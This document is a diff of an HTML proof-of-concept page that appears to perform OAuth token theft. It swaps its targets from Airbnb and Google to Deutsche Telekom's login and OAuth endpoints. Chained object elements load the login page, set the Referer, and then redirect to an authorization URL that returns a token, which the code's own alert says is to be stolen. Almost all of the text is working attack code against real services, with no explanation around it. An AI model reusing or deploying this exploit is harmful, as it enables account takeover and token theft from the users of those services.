@@ -10,9 +10,9 @@ if(window.location.hash) {
 }
 </script>
 
-<object id=loginpage data="https://www.airbnb.cat/login/" onload="alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://www.airbnb.cat/oauth_connect?from=google_login&service=google');"></object>
+<object id=loginpage data="https://accounts.login.idm.telekom.com/login/" onload="alert('Login page loaded. Now attempting login'); document.getElementById('googlepage').setAttribute('data', 'https://accounts.login.idm.telekom.com/oauth2/auth?response_type=code,token');"></object>
 
-<object id=googlepage width="400" height="50" onload="alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://accounts.google.com/o/oauth2/auth?response_type=code,token&access_type=offline&client_id=622686756548-j87bjniqthcq1e4hbf1msh3fikqn892p.apps.googleusercontent.com&state=WCTSVKIWPIXNFWEBRUIBNBJGJPYIJN&scope=profile+email&redirect_uri=https%3A%2F%2Fwww.airbnb.cat%2Foauth_callback';"></object> 
+<object id=googlepage width="400" height="50" onload="alert('Logged in & Referer header set. Now redirecting to steal the token!'); window.location = 'https://accounts.login.idm.telekom.com/oauth2/auth?client_id=10LIVESAM30000004901VESPAPICOTELEKOM0000&redirect_uri=https://www.telekom.de/tech/sam/ess/callback&response_type=code,token&scope=openid&state=c0e76bc3-18b7-40b9-8032-17701dcbbcb2&display=page';"></object> 
 
 </body>
 </html> 
